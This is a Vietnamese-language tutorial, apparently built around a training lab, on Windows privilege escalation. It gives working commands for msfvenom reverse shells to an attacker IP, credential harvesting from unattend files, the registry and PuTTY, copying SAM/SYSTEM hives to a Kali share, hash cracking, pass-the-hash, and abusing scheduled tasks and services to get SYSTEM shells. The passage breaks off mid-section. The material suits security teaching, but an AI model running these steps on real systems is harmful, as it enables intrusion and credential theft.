# **Giới thiệu**

Leo thang đặc quyền là dùng quyền truy cập máy chủ của user A và tận dụng nó để lấy quyền truy cập của user B bằng cách khai thác điểm yếu của hệ thống. Trong khi ta muốn user B có quyền quản trị, có nhiều tình huống mà ta cần leo thang nhiều tài khoản khác trước khi có quyền quản trị.

Dành quyền truy cập vào nhiều tài khoản khác nhau có thể đơn giản như tìm kiếm thông tin đăng nhập trong 1 tệp văn bản hoặc  bảng tính không được bảo mật bởi người dùng thiếu cẩn thận. Nhưng trường hợp đó rất ít xảy ra. Ta thường sẽ lợi dụng những điểm yếu sau:

* Cấu hình sai các dịch vụ Windows hoặc scheduled tasks
    
* Tài khoản vượt quá mức đặc quyền cho phép
    
* Lỗ hổng phần mềm
    
* Bỏ lỡ các bản vá bảo mật của Windows
    

# **Windows Users**

Hệ thống Windows có hai loại người dùng chính. Dựa vào mức độ truy cập của họ, ta có thể phân loại người dùng thành những nhóm sau:

| Quản trị viên | Người dùng có đặc quyền cao nhất. Họ có thể thay đổi các tham số cấu hình và truy cập bất cứ tệp nào trên hệ thống |
| --- | --- |
| Người dùng thông thường | Có thể truy cập máy tính nhưng bị giới hạn một số tác vụ quan trọng. Họ không thể đưa ra những thay đổi lâu dài và cần thiết cho hệ thống và tệp tin. |

Bất cứ người dùng nào có đặc quyền quản trị sẽ là 1 phần của nhóm Quản Trị. Mặt khác, standard user là 1 phần của nhóm Users. 

Ngoài ra, bạn sẽ thường nghe thấy một vài tài khoản đặc biệt được dựng sẵn bởi hệ điều hành :

| System / LocalSystem | 1 tài khoản được dùng bởi hệ điều hành để thực hiện các tác vụ nội bộ. Có thể truy cập được tất cả tập tin và mã nguồn trên máy chủ, thậm chi đặc quyền còn cao hơn quản trị viên. |
| --- | --- |
| Local Service | Tài khoản mặc định được dùng để chạy các dịch vụ Windows với mức độ đặc quyền ít nhất. Nó sẽ dùng kết nối anonymous qua mạng. |
| Network Service | Tài khoản mặc định được dùng để chạy các dịch vụ Windows với mức độ đặc quyền ít nhất. Nó sẽ dùng thông tin đăng nhập để xác thực qua mạng. |

Những tài khoản này được tạo và quản lý bởi windows và bạn sẽ không thể dùng chúng như những tài khoản thông thường. Trong một số tính huống, bạn có thể leo thang đặc quyền nhờ khai thác những dịch vụ riêng.

# **Spawning Administrator Shells**

## **msfvenom**

Nếu chúng ta có thể thực thi lệnh với đặc quyền của admin, tạo 1 reverse shell bằng msfvenom:

```javascript
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.8.55.148 lport=1234 -f exe -o reverse-shell.exe
```

## **RDP**

Nếu RDP khả thi, chúng ta có thể thêm người dùng có đặc quyền thấp vào nhóm administrators:

```javascript
net localgroup administrators <username> /add
```

## **Admin → SYSTEM**

Để leo thang đặc quyền từ admin lên hệ thống, bạn có thể dùng công cụ PsExec từ Windows Sysinternals (https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)

```javascript
.\PsExec64.exe -accepteula -i -s C:\PrivEsc\reverse.exe
```

# **Thu thập mật khẩu từ các điểm thông thường**

Cách dễ nhất để giành quyền truy cập vào 1 tài khoản khác là lấy được thông tin đăng nhập từ hệ thống. Các tài khoản có thể tồn tại với rất nhiều lí do, bao gồm người dùng thiếu cẩn thận để nó ở 1 tệp plaintext; hay được lưu trữ bởi một vài phần mềm như trình duyệt hay email.

Bài này sẽ cho bạn thấy một vài nơi để tìm kiếm mật khẩu trên hệ thống Windows.

## **Những cài đặt Windows không cần giám sát**

Khi cài đặt 1 image của hệ điều hành được triển khai đến các máy chủ khác qua mạng. Loại cài đặt này không cần giám sát vì chúng không yêu cầu sự tương tác của người dùng. Những cài đặt này yêu cầu dùng tài khoản của quản trị viên để thiết lập ban đầu, có thể dẫn đến việc được lưu trữ trong máy ảo ở các vị trí sau:

* C:\\Unattend.xml
    
* C:\\Windows\\Panther\\Unattend.xml
    
* C:\\Windows\\Panther\\Unattend\\Unattend.xml
    
* C:\\Windows\\system32\\sysprep.inf
    
* C:\\Windows\\system32\\sysprep\\sysprep.xml
    

Bạn có thể gặp thông tin đăng nhập sau:

```javascript
 <Credentials>

    <Username>Administrator</Username>

    <Domain>thm.local</Domain>

    <Password>MyPassword123</Password>

</Credentials> 
```

## **Powershell History**

Khi một người dùng chạy lệnh với Powershell, nó sẽ lưu trữ trong 1 tệp để nhớ các câu lệnh trước. Điều này rất hữu ích để lặp lại các lệnh bạn đã dùng trước đó. Nếu 1 người dùng chạy 1 lệnh bao gồm mật khẩu là một phần của lệnh Powershell, nó có thể được truy cập lại bằng lệnh sau cmd.exe

```javascript
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

 **Lưu ý:** lệnh trên chỉ hoạt đông từ cmd.exe vì Powershell không nhận ra %userprofile% là 1 biến môi trường. Để đọc tệp từ Powershell, bạn phải thay thế %userprofile% với $Env:userprofile

## **Thông tin đăng nhập được lưu trong windows**

Windows cho phép chúng ta dùng thông tin đăng nhập của người dùng khác.

Chức năng này cung cấp lựa chọn để lưu thông tin đăng nhập trên hệ thống. Để liệt kê những thông tin đăng nhập đã lưu, dùng lệnh sau: 

```javascript
cmdkey /list
```

Bạn không thấy mật khẩu thật, nếu bạn để ý thấy bất cứ thông tin đăng nhập nào đáng để thử, bạn có thể chạy lệnh runas và lựa chọn /savecred.

```javascript
runas /savecred /user:admin cmd.exe 
```

## **IIS Configuration**

Internet Information Services (IIS) là máy chủ web mặc định trên Windows. Cấu hình của các trang web trên IIS được lưu trong file web.config và có thể lưu mật khẩu cho csdl hay các cơ chế xác thực. Dựa vào phiên bản đã cài đặt của IIS, chúng ta có thể thấy web.config ở một trong những vị trí sau:

* C:\\inetpub\\wwwroot\\web.config
    
* C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config
    

Đây là cách nhanh nhất để tìm chuỗi “kết nối dữ liệu” trong file:

```javascript
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

## **Truy suất thông tin đăng nhập từ phần mềm: PuTTY**

PuTTY là 1 SSH client thường được tìm thấy trên Windows. Thay vì phải chỉ định các tham số kết nối mỗi lần, người dùng có thể lưu trữ các phiên trong đó IP, người dùng và các cấu hình khác có thể được lưu trữ để dùng sau này. Trong khi PuTTY không cho phép người dùng lưu mật khẩu SSH, nó sẽ lưu trữ các cấu hình proxy bao gồm thông tin xác thực (cleartext).

Để truy suất thông tin xác thực được lưu trữ trong proxy, bạn có thể tìm kiếm ProxyPassword theo registry key sau  bằng lệnh:

```javascript
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

**Lưu ý:** Simon Tatham là người sáng tạo ra PuTTY (tên của anh ấy là 1 phần của đường dẫn), không phải là tên mà chúng ta sẽ truy suất mật khẩu. Tên người dùng được lưu trữ trong proxy có thể được nhìn thấy sau khi chạy lệnh trên.

Không chỉ có putty lưu trữ thông tin đăng nhập, bất cứ phần mềm nào lưu trữ mật khẩu, bao gồm trình duyệt, email clients, FTP clients, SSH clients, VNC sẽ có các phương thức khác nhau để khôi phục mật khẩu mà người dùng đã lưu.

## **Registry**

Registry có thể tìm kiếm các keys và giá trị chứa từ “password”:

```javascript
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

Nếu bạn muốn tiết kiệm thời gian, truy vấn đến key để tìm thông tin đăng nhập AutoLogon của admin: 

```javascript
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon" 
```

<img width="386" height="327" alt="image" src="https://github.com/user-attachments/assets/ddf64c29-fbd6-43cd-bc4a-b7233db85c87" />

Vì một vài lí do mật khẩu không được lưu trong registry. Bạn có thể nhập mật khẩu là password123

Trên Kali, dùng lệnh winexe để mở command prompt chạy với đặc quyền của admin:

```javascript
winexe -U 'admin%password123' //10.10.126.24 cmd.exe
```

## **Security Account Manager (SAM)**

* Windows lưu trữ password hashes trong SAM.
    
* Key mã hóa Hashes được lưu trong SYSTEM
    
* Nếu bạn có thể đọc SAM và SYSTEM, bạn có thể trích xuất hashes.
    
* SAM và SYSTEM được lưu ở thư mục C:\\Windows\\System32\\config
    
* Các tệp bị khóa khi Windows đang chạy.
    
* Máy ảo lưu trữ bản sao lưu của SAM và SYSTEM trong thư mục C:\\Windows\\Repair\\
    

Vận chuyển SAM và SYSTEM đến Kali:

```javascript
copy C:\Windows\Repair\SAM \\10.8.55.148\kali\

copy C:\Windows\Repair\SYSTEM \\10.8.55.148\kali\
```

Trên Kali, clone kho chứa creddump7 và dùng nó để dump hash từ SAM và SYSTEM:

```javascript
git clone https://github.com/Tib3rius/creddump7

pip3 install pycryptodome

python3 creddump7/pwdump.py SYSTEM SAM 
```

<img width="468" height="202" alt="image" src="https://github.com/user-attachments/assets/cd62e601-dad0-4d8c-9415-505f5fee192e" />

Crack NTLM hash của admin bằng hashcat:

```javascript
hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
```

## **Passing the Hash**

Tại sao phải crack password hash trong khi chúng ta có thể xác thực bằng hash?

Dùng full admin hash với pth-winexe để spawn shell không cần crack mật khẩu.

Nhớ full hash bao gồm LM và NTLM hash, được phân tách nhau bằng dấu hai chấm:

```javascript
pth-winexe -U 'admin%hash' //MACHINE_IP cmd.exe 
```

<img width="468" height="158" alt="image" src="https://github.com/user-attachments/assets/e26abc54-f20f-41af-b750-d5b86f26acd6" />

# **Other Quick Wins**

## **Scheduled Tasks**

Windows có thể được cấu hình để chạy tasks mỗi 5 phút.

Tasks thường chạy với đặc quyền của người dùng tạo ra nó, tuy nhiên quản trị viên có thể cấu hình các tác vụ để chạy với đặc quyền của người khác như SYSTEM.

Không dễ để liệt kê các tác vụ của người dùng khác khi bạn có đặc quyền thấp.

Liệt kê các tác vụ bạn có thể thấy:

```javascript
schtasks /query /fo LIST /v
```

Thường chúng ta dựa vào manh mối khác, như tìm kiếm script hoặc log file chỉ ra task đang được lên lịch để chạy.

Nhìn vào scheduled tasks trên hệ thống đích, bạn có thể thấy scheduled task hoặc là bị mất tệp nhị phân hoặc là dùng 1 tệp nhị phân bạn có thể chỉnh sửa.

Scheduled tasks có thể được liệt kê bằng lệnh schtasks. Để xem thông tin chi tiết hơn về dịch vụ, bạn có thể dùng lệnh như sau:

<img width="468" height="144" alt="image" src="https://github.com/user-attachments/assets/b0581927-68ff-4a56-b2f3-3516d705504d" />

Bạn sẽ nhận được rất nhiều thông tin về 1 tác vụ, nhưng điều quan trọng với chúng ta là tham số “Task to Run” chỉ ra cái được thực thi bởi scheduled task và tham số “Run As User” hiển thị người dùng sẽ chạy tác vụ đó.

Nếu bạn có thể điều chỉnh hoặc ghi đè tệp thực thi “Task to Run”, chúng ta có thể kiểm soát cái được thực thi bởi user taskusr1, dẫn đến leo thang đặc quyền. Để kiểm tra đặc quyền trên file thực thi, dùng lệnh icacls:

<img width="468" height="117" alt="image" src="https://github.com/user-attachments/assets/3cfaf1cb-bd6f-4e2f-b4dd-00140165a092" />

Nhóm BUILTIN\\Users có toàn quyền với tệp thực thi  Chúng ta có thể điều chỉnh file .bat và tiêm payload chúng ta thích. Để cho tiện lợi, nc64.exe có thể được tìm thấy trên C:\\tools. Cùng thay đổi tệp bat để mở 1 reverse shell:

<img width="468" height="83" alt="image" src="https://github.com/user-attachments/assets/7104bcc8-0987-493f-a6c5-5a874c7ce771" />

Sau đó bắt đầu 1 listener trên máy của kẻ tấn công:

```javascript
nc -lnvv -p 4444 
```

Lần tiếp theo khi scheduled tasks chạy, bạn sẽ nhận được reverse shell với đặc quyền của người dùng taskusr1. Trong khi bạn không thể bắt đầu 1 tác vụ trong hoàn cảnh thực tế và sẽ phải đợi để tác vụ đó được kích hoạt, chúng tôi đã cung cấp cho người dùng của bạn các đặc quyền để bắt đầu tác vụ 1 cách thủ công để giúp bạn tiết kiệm thời gian. Chúng ta có thể chạy tác vụ với lệnh sau:

<img width="468" height="72" alt="image" src="https://github.com/user-attachments/assets/615ff61d-5c89-4dc3-ae21-1bcd77044e6b" />

Và bạn sẽ nhận được reverse shell với đặc quyền của taskusr1 như mong đợi:

<img width="468" height="175" alt="image" src="https://github.com/user-attachments/assets/af0147bf-4cb6-4f7c-9d5c-3cf1153dd9cb" />

## **AlwaysInstallElevated**

Các tập tin cài đặt trên Windows (tệp .msi) được dùng để cài đặt các ứng dụng trên hệ thống. Chúng thường được chạy với mức độ đặc quyền của người dùng bắt đầu nó. Tuy nhiên, điều này có thể được cấu hình để chạy với các đặc quyền cao hơn từ bất cứ tài khoản nào của người dùng. Điều này có thể cho phép chúng ta tạo 1 tệp MSI độc hại sẽ chạy với đặc quyền của admin.

Phương pháp này yêu cầu 2 giá trị registry được thiết lập. Bạn có thể truy vấn chúng bằng lệnh sau: 

```javascript
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer 
```

<img width="378" height="41" alt="image" src="https://github.com/user-attachments/assets/f9bfbe36-d76b-4ca7-8ae1-58accaacb628" />

```javascript
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer 
```

<img width="383" height="46" alt="image" src="https://github.com/user-attachments/assets/6dbaa4df-634a-4d58-8887-274b09174398" />

Bạn có thể tạo 1 tệp .msi độc hai bằng msfvenom như sau: 

<img width="468" height="66" alt="image" src="https://github.com/user-attachments/assets/b85e0d5a-1069-44d3-9f18-2b470d5a5626" />

Vì nó là reverse shell, bạn nên chạy module Metasploit Handler để lắng nghe kết nối đến. Khi bạn chuyển được tệp bạn mới tạo, bạn có thể chạy installer với lệnh sau và nhận kết nối: 

<img width="468" height="72" alt="image" src="https://github.com/user-attachments/assets/617ece49-5c64-44cc-a3e3-8f5f29a6bdab" />

# **Abusing Service Misconfigurations**

## **Windows Services**

Các dịch vụ của Windows được quản lí bởi Service Control Manager (SCM). SCM là 1 quá trình quản lí trạng thái của các dịch vụ khi cần thiết, kiểm tra tình trạng hiện tại của 1 dịch vụ và cung cấp 1 cách để cấu hình các dịch vụ.

Mỗi dịch vụ trên máy Windows sẽ có 1 tệp thực thi tương ứng sẽ được chạy bởi SCM khi 1 dịch vụ bắt đầu. Điều quan trọng là các dịch vụ thực thi thực hiện các chức năng đặc biệt để có thể giao tiếp với SCM và do đó không có bất cứ tệp thực thi nào có thể bắt đầu 1 dịch vụ thành công. Mỗi dịch vụ chỉ định 1 người dùng mà dịch vụ đó sẽ chạy.

Để hiểu rõ hơn về cấu trúc của 1 dịch vụ, cùng kiểm tra cấu hình dịch vụ apphostsvc với lệnh sc qc:

<img width="409" height="212" alt="image" src="https://github.com/user-attachments/assets/fbd0809b-ac7d-4124-a4ab-b4739d37f2f8" />

Ta có thể thấy tệp thực thi  được chỉ định qua tham số BINARY\_PATH\_NAME, và tài khoản dùng để chạy dịch vụ được hiển thị trong tham số SERVICE\_START\_NAME.

Các dịch vụ có 1 danh sách kiểm soát truy cập tùy ý (DACL), chỉ định ai có đặc quyền để bắt đầu, ngưng, kết thúc, truy vấn cấu hình hay cấu hình lại dịch vụ. DACL có thể được xem bằng Process Hacker.

<img width="306" height="321" alt="image" src="https://github.com/user-attachments/assets/57c62e39-8f0d-4447-ad9e-f235e71f2a38" />

Tất cả cấu hình dịch vụ được lưu trữ trong registry HKLM\\SYSTEM\\CurrentControlSet\\Services\\

<img width="430" height="200" alt="image" src="https://github.com/user-attachments/assets/9da3c720-c6ac-41f9-add3-a92156cae976" />

Một subkey tồn tại trong mỗi dịch vụ trên hệ thống. Ta có thể thấy tệp thực thi ở giá trị ImagePath và tài khoản bắt đầu dịch vụ trên ObjectName. Nếu DACL đã được cấu hình cho dịch vụ, nó sẽ được lưu trữ trong 1 subkey gọi là Security. Chỉ có quản trị viên có thể điều chỉnh các dòng registry trên.

## **Insecure Permissions on Service Executable**

Nếu các tệp thực thi của dịch vụ có đặc quyền yếu cho phép kẻ tấn công điều chỉnh hoặc thay thế nó, kẻ tấn công có thể leo thang đặc quyền đến tài khoản của dịch vụ trên.

### **Detection:**

Chạy winPEAS để kiểm tra các dịch vụ bị lỗi cấu hình:

```javascript
.\winPEASany.exe quiet servicesinfo
```
<img width="468" height="48" alt="image" src="https://github.com/user-attachments/assets/a6c09cfe-0676-43b4-8a9c-d794aae4f8f6" />

File Permissions: Everyone \[AllAccess\]

Kiểm tra xem người dùng có khởi chạy/dừng dịch vụ được không

```javascript
accesschk.exe -qlc filepermsvc
```
<img width="364" height="244" alt="image" src="https://github.com/user-attachments/assets/f9db7642-4465-4fa9-8a26-9e273beb6f6c" />

### **Exploitation:** 

Để hiểu cách nó hoạt động, cùng nhìn vào 1 lỗ hổng được tìm thấy trên Splinterware System Scheduler. Để bắt đầu, chúng ta sẽ truy vấn đến cấu hình dịch vụ bằng sc:

<img width="352" height="186" alt="image" src="https://github.com/user-attachments/assets/0ba21d7d-01c5-43a0-890d-7cb2efd6e970" />

Chúng ta có thể thấy dịch vụ được cài đặt bởi 1 phần mềm có lỗ hổng do svcuser1 chạy và tệp thực thi là C:\\Progra~2\\System~1\\WService.exe. Sau đó tiếp tục kiểm tra đặc quyền trên tệp thực thi:

<img width="468" height="217" alt="image" src="https://github.com/user-attachments/assets/d60efbbb-0111-4b96-bfc0-b086287a365c" />

Nhóm Everyone có thể chỉnh sửa (M) trên tệp thực thi. Điều đó đồng nghĩa với việc chúng ta có thể ghi đè nó với payload độc hại và dịch vụ sẽ thực thi nó với đặc quyền của người dùng đã cấu hình.

Cùng tạo 1 payload exe-service bằng msfvenom và chuyển nó qua python webserver:  

<img width="468" height="129" alt="image" src="https://github.com/user-attachments/assets/c394d27a-2718-4d2a-b4f6-6429e8abcec9" />

Sau đó, ta lấy payload từ Powershell bằng lệnh sau: 

<img width="468" height="69" alt="image" src="https://github.com/user-attachments/assets/c52b5743-48ab-4479-abef-d96b41d07a7d" />

Khi payload ở trên máy chủ Windows,  tiếp tục thay thế tệp thực thi bằng payload của chúng ta. Ta cần 1 người dùng khác thực thi nó → cấp toàn quyền cho nhóm Everyone

<img width="468" height="204" alt="image" src="https://github.com/user-attachments/assets/3c188499-8aa6-4d72-85fb-6daeab59d84d" />

Bắt đầu 1 listener trên máy của kẻ tấn công: nc -lnvv -p 4445

Cuối cùng, đợi dịch vụ khởi động. Trong 1 ngữ cảnh thông thường, bạn sẽ phải đợi để dịch vụ đó khởi động. Nhưng trong máy ảo bạn được cấp quyền khởi động để tiết kiệm thời gian.

<img width="468" height="86" alt="image" src="https://github.com/user-attachments/assets/91be5107-95a5-4724-9e91-95ef72e5db2e" />

**Lưu ý:** Powershell không có sc (Set-Content), do đó bạn cần dùng sc.exe để kiểm soát các dịch vụ với PowerShell bằng cách này.

Bạn sẽ nhận được reverse shell với đặc quyền của svcusr1:

<img width="468" height="174" alt="image" src="https://github.com/user-attachments/assets/4da335e8-f838-48db-9ad2-e0834ac827b5" />

Cách di chuyển đến thư mục của người dùng: cd %userprofile%

## **Unquoted Service Paths**

### **Detection**

Chạy winPEAS để kiểm tra các dịch vụ bị lỗi cấu hình:

```javascript
.\winPEASany.exe quiet servicesinfo
```
<img width="468" height="50" alt="image" src="https://github.com/user-attachments/assets/4c8fed78-2696-4c24-be4e-3187bf9ce78c" />

No quotes and Space detected

Kiểm tra xem người dùng có khởi chạy/dừng dịch vụ được không

```javascript
accesschk.exe -qlc unquotedsvc
```

Tùy thuộc vào phiên bản của accesschk.exe, cách chạy sẽ khác nhau

```javascript
accesschk.exe -ucqv [service_name]
```
<img width="468" height="312" alt="image" src="https://github.com/user-attachments/assets/e67551cf-14ec-461a-acad-63cf4b663b28" />

### **Exploitation**

Khi chúng ta không thể ghi trực tiếp vào các tệp thực thi của dịch vụ như trước đây, vẫn còn 1 cơ hội buộc 1 dịch vụ chạy các tệp thực thi tùy ý bằng cách sử dụng 1 tính năng khá khó hiểu.

Khi làm việc với các dịch vụ trên Windows, một hành vi rất cụ thể sẽ xảy ra khi dịch vụ được cấu hình để trỏ đến tệp thực thi không trích dẫn. Khi không trích dẫn, chúng ta muốn nói rằng đường dẫn của tệp thực thi không được trích dẫn chính xác để giải thích khoảng trắng trên lệnh 

Ví dụ, xem sự khác nhau giữa hai dịch vụ. Dịch vụ đầu tiên được trích dẫn chính xác để SCM biết chắc chắn rằng nó phải thực thi tệp nhị phân được chỉ ra: "C:\\Program Files\\RealVNC\\VNC Server\\vncserver.exe"

**Lưu ý:** Bạn cần dùng ‘sc.exe’ nếu bạn đang ở PowerShell prompt.

<img width="399" height="204" alt="image" src="https://github.com/user-attachments/assets/ac222c0e-da9f-4297-bb77-743d88b47737" />

Cùng xem 1 dịch vụ khác không được trích dẫn chính xác:

<img width="399" height="206" alt="image" src="https://github.com/user-attachments/assets/dae0be6a-4522-446d-b351-1beae17f7a97" />

Khi SCM cố gắng thực thi tệp nhị phân, 1 vấn đề sẽ phát sinh. Vì có nhiều khoảng trắng trong tên của thư mục “Disk Sorter Enterprise”, lệnh này trở nên mơ hồ và SCM không biết bạn cố gắng thực thi lệnh nào.

<img width="468" height="138" alt="image" src="https://github.com/user-attachments/assets/bfaa5f21-34b8-4827-97e7-75fc3450d6ab" />

Khi bạn gửi 1 lệnh, các khoảng trắng thường là đối số phân tách nếu chúng không phải là 1 chuỗi trích dẫn. Câu lệnh được thực thi là C:\\\\MyPrograms\\\\Disk.exe và lấy phần còn lại là đối số.

Thay vì từ chối thực thi, SCM cố gắng giúp người dùng và bắt đầu tìm kiếm các tập nhị phân theo thứ tự trong bảng: 

1. Đầu tiên, tìm kiếm C:\\\\MyPrograms\\\\Disk.exe. Nếu nó tồn tại, dịch vụ sẽ chạy tệp thực thi này.
    
2. Nếu không tồn tại, nó sẽ tìm kiếm C:\\\\MyPrograms\\\\Disk Sorter.exe
    
3. Tìm kiếm tiếp C:\\\\MyPrograms\\\\Disk Sorter Enterprise\\\\bin\\\\disksrs.exe. Tùy chọn này được mong đợi là thành công và thường sẽ được chạy trong cài đặt mặc định
    

Nếu kẻ tấn công tạo bất cứ tệp thực thi mà được tìm kiếm trước tệp thực thi mong đợi của dịch vụ, họ có thể buộc dịch vụ chạy 1 tệp thực thi tùy ý.

Đa số các tệp thực thi của dịch vụ sẽ được cài đặt trong C:\\Program Files hoặc C:\\Program Files (x86) theo mặc định, người dùng không có đặc quyền không thể ghi được. Điều này ngăn chặn các dịch vụ có lỗ hổng bị khai thác. Có các ngoại lệ với quy tắc này:

* Một số trình cài đặt thay đổi đặc quyền trên các thư mục đã cài đặt, làm cho các dịch vụ có lỗ hổng.
    
* Quản trị viên cài đặt các tệp nhị phân của dịch vụ theo đường dẫn không mặc định. Nếu như đó là 1 đường dẫn có thể ghi, lỗ hổng có thể khai thác được.
    

Trong trường hợp của chúng ta, quản trị viên đã cài đặt tệp nhị phân Disk Sorter  ở c:\\MyPrograms. Theo mặc định, nó sẽ được kế thừa các đặc quyền của thư mục C:\\, cho phép bất cứ người dùng nào có thể tạo tập tin và thư mục trong nó. Chúng ta có thể kiểm tra bằng icacls: 

<img width="468" height="175" alt="image" src="https://github.com/user-attachments/assets/6d8daf5e-c308-4eb7-8e3d-27dccb36b6b0" />

Nhóm BUILTIN\\\\Users có đặc quyền AD và WD, cho phép người dùng tạo các thư mục con và tập tin.

Quá trình tạo payload exe-service với msfvenom và vận chuyển nó đến máy chủ đích giống như trước đó. Chúng ta sẽ mở listener để nhận reverse shell khi nó được thực thi:

<img width="468" height="101" alt="image" src="https://github.com/user-attachments/assets/32c98d8f-12dc-43a8-85b4-608c32b8a723" />

Di chuyển payload đến C:\\MyPrograms\\Disk.exe. Chúng ta sẽ cấp toàn quyền cho mọi người trên file để đảm bảo nó được thực thi bởi dịch vụ:

<img width="468" height="99" alt="image" src="https://github.com/user-attachments/assets/69b6970e-229d-430e-83eb-472a6c34aaa8" />

Khi dịch vụ khởi động lại, payload của bạn sẽ được thực thi:

<img width="468" height="76" alt="image" src="https://github.com/user-attachments/assets/6add7351-7bd3-4d78-bc3d-0ab5c4b3726e" />

Bạn nhận được reverse shell với đặc quyền của svcusr2:

<img width="468" height="154" alt="image" src="https://github.com/user-attachments/assets/024f544e-f608-4ffc-8a1c-6c0d58265961" />

## **Insecure Service Permissions**

Bạn vẫn có 1 chút cơ hội để tận dụng 1 dịch vụ thậm chí tệp thực thi của dịch vụ đó (DACL) được cấu hình tốt và đường dẫn được trích dẫn chính xác. DACL của dịch vụ (không phải là DACL của tệp thực thi dịch vụ) cho phép bạn điều chỉnh cấu hình của 1 dịch vụ, trỏ đến 1 tệp thực thi bất kỳ mà bạn cần và chạy nó với đặc quyền mà bạn thích, bao gồm tài khoản SYSTEM.

* Một số đặc quyền vô hại: SERVICE\_QUERY\_CONFIG, SERVICE\_QUERY\_STATUS
    
* Một số đặc quyền có ích: SERVICE\_STOP, SERVICE\_START
    
* Một số đặc quyền nguy hiểm: SERVICE\_CHANGE\_CONFIG, SERVICE\_ALL\_ACCESS
    

### **Detection:**

Chạy winPEAS để kiểm tra các dịch vụ bị lỗi cấu hình:

```javascript
.\winPEASany.exe quiet servicesinfo
```

<img width="468" height="32" alt="image" src="https://github.com/user-attachments/assets/0cf91a26-bf4f-459f-a9fa-c1a427d57c4a" />

Chúng ta có thể điều chỉnh dịch vụ daclsvc.

### **Exploitation:**

Để kiểm tra DACL của dịch vụ từ dòng lệnh, bạn có thể dùng Accesshk từ Sysinternals suite. Để cho thuận tiện, 1 bản sao chép đã có sẵn ở C:\\\\tools. Lệnh kiểm tra DACL của dịch vụ thmservice:

<img width="468" height="222" alt="image" src="https://github.com/user-attachments/assets/36ba1e91-a681-43c6-868c-115ba7149c12" />

Nhóm BUILTIN\\\\Users  có đặc quyền SERVICE\_ALL\_ACCESS, bất cứ ai cũng có thể cấu hình dịch vụ.

Trước khi thay đổi dịch vụ, hãy dựng 1 exe-service reverse shell khác và bắt đầu 1 listener trên máy của kẻ tấn công. 

<img width="468" height="102" alt="image" src="https://github.com/user-attachments/assets/5ea9df40-4187-43ba-8693-f192c0bf437e" />

Vận chuyển tệp thực thi đến máy đích và lưu nó ở C:\\Users\\thm-unpriv\\rev-svc3.exe.  Nhớ cấp quyền cho mọi người để thực thi payload:

<img width="468" height="63" alt="image" src="https://github.com/user-attachments/assets/b0652fec-b7db-4ca1-baaa-82e2beeb93a6" />

Để thay đổi tệp thực thi và tài khoản của dịch vụ, chúng ta có thể dùng lệnh sau: 

<img width="468" height="76" alt="image" src="https://github.com/user-attachments/assets/b2c00ae6-5e5c-46d3-a67a-f2cedd714f7d" />

Lưu ý chúng ta có thể dùng bất cứ tài khoản nào để chạy dịch vụ. Chúng ta chọn LocalSystem là tài khoản có đặc quyền cao nhất. Để thực thi payload, khởi động lại dịch vụ: 

<img width="468" height="73" alt="image" src="https://github.com/user-attachments/assets/4cd86bba-a96a-4961-83aa-cd5b2dac5337" />

Và chúng ta sẽ nhận được shell trong máy của kẻ tấn công với đặc quyền của SYSTEM: 

<img width="468" height="153" alt="image" src="https://github.com/user-attachments/assets/8dbf4db6-64ce-4f56-97b2-f58c251aeb06" />

# **Windows Privileges**

Đặc quyền tức là 1 tài khoản phải thực hiện các tác vụ cụ thể liên quan đến hệ thống. Các tác vụ có thể đơn giản như tắt máy tính hoặc bỏ qua kiểm soát truy cập của DACL.

Mỗi người dùng có 1 danh sách các đặc quyền có thể kiểm tra bằng lệnh sau:

```javascript
whoami /priv
```

Một danh sách các đặc quyền khả thi trên hệ thống Windows có sẵn ở trang https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants

Kẻ tấn công chỉ hứng thú với những đặc quyền cho phép họ leo thang trong hệ thống. Bạn có thể tìm 1 danh sách các đặc quyền có thể khai thác ở trang Priv2Admin.

## **SeBackup/SeRestore**

Các đặc quyền SeBackup và SeRestore cho phép người dùng đọc và ghi bất cứ file nào trên hệ thống, bỏ qua DACL. Ý tưởng đằng sau đặc quyền này là cho phép người dùng thực hiện sao lưu từ 1 hệ thống mà không yêu cầu đặc quyền của quản trị viên. 

Có được sức mạnh này, kẻ tấn công có thể leo thang đặc quyền trên hệ thống bằng rất nhiều kĩ thuật. Đầu tiên chúng ta sẽ sao chép SAM và SYSTEM registry hives để trích xuất password hash của local Administrator.

Đăng nhập vào máy ảo qua RDP với thông tin đăng nhập sau:

```javascript
User: THMBackup

Password: CopyMaster555
```

Tài khoản này là 1 phần của nhóm “Backup Operators” được cấp quyền SeBackup và SeRestore. Chúng ta sẽ mở command prompt với tư cách là quản trị viên để sử dụng đặc quyền đó. Nhập lại mật khẩu 1 lần nữa để có được elevated console.

<img width="255" height="105" alt="image" src="https://github.com/user-attachments/assets/96b4248c-4af2-4206-b8bd-9401120a1d2e" />

Kiểm tra đặc quyền bằng lệnh sau:

<img width="415" height="217" alt="image" src="https://github.com/user-attachments/assets/27d883b6-822b-4b18-9d2d-6edef6aa0327" />

Để sao lưu SAM và SYSTEM hashes, chúng ta có thể dùng lệnh sau:

<img width="415" height="122" alt="image" src="https://github.com/user-attachments/assets/ec0e29a8-4089-4a4d-9201-84f0ba7e7a84" />

Điều này sẽ tạo một vài tập tin với registry hives content. Bây giờ chúng ta có thể sao chép những tệp đó đến máy của kẻ tấn công bằng SMB hoặc các phương thức khác. Đối với SMB, chúng ta có thể dùng smbserver.py để bắt đầu 1 máy chủ SMB đơn giản với 1 network share trong thư mục hiện hành của kẻ tấn công.

<img width="468" height="106" alt="image" src="https://github.com/user-attachments/assets/2d5e1d5e-83d8-428f-8fc9-6ec4dd5fd05e" />

Điều này sẽ tạo 1 share tên public trỏ đến thư mục share, yêu cầu tên người dùng và mật khẩu của phiên windows hiện tại. Sau đó, chúng ta có thể dùng lệnh copy trong máy nạn nhân để vận chuyển cả hai tệp qua AttackBox:

